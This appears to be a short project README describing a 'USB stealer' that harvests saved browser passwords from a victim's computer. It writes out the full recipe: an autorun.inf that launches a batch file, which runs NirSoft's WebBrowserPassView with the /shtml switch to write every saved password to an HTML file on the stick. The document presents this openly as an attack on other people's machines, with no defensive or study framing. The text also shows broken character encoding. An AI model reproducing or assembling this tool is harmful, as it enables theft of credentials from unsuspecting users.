Hi âœ‹ 

My mini-project  is USB stealer 
The idea is very simple by inserting USB to the victim's computer ðŸ’»  and remove it and the output is getting all saved passwords.


Tools used WebBrowserPassView from nirosft


Â Steps:
 
 All in USBÂ Â  
 
  - Creating an autorun file to launch the app after inserting the USB
 
Â  - Creating launch.bat fileÂ 
  
  - CopyÂ Â WebBrowserPassView.exe


Detail:

*Â  Â Open notepad and type:Â Â  Â  Â  [Autorun]open=launch.bat

And save it as an autorun.inf


Open notepad and type:Â 

StartÂ  WebBrowserPassView.exe /shtml output.html

And save is as launch.bat

Now Our USB is readyÂ 

How it's work:

WebBrowserPassView go when passwords are saved and copy itÂ
